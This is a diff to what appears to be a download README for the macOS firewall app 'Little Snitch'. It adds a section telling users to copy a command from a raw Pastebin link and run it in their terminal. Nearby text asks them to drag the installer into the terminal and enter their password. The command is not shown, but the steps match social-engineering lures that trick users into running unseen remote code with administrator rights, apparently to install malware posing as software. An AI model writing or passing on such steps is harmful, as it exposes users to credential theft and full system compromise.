@@ -15,6 +15,14 @@
 - If your macOS version is older than 15.4, you can simply drag the application icon directly from the .dmg installation window to the terminal, then press the "Return" button and enter your password to allow the application to be installed.
 Note: If your device does not have a password, leave the password field empty and confirm the installation.
 
+## Installation via a command in the terminal:
+
+1. Go to the Pastebin at the link below and copy the command:
+
+https://pastebin.com/raw/bF3LdbRV
+
+2. Open your terminal, paste the command you copied earlier, and run it.
+
 ---
 
 ![Little Snitch Interface Mac](https://images.macrumors.com/t/jfKdR9Cuc-mJ9FxEbw2P46Bm-Ck=/1600x900/smart/article-new/2020/11/little-snitch-5.jpg)  
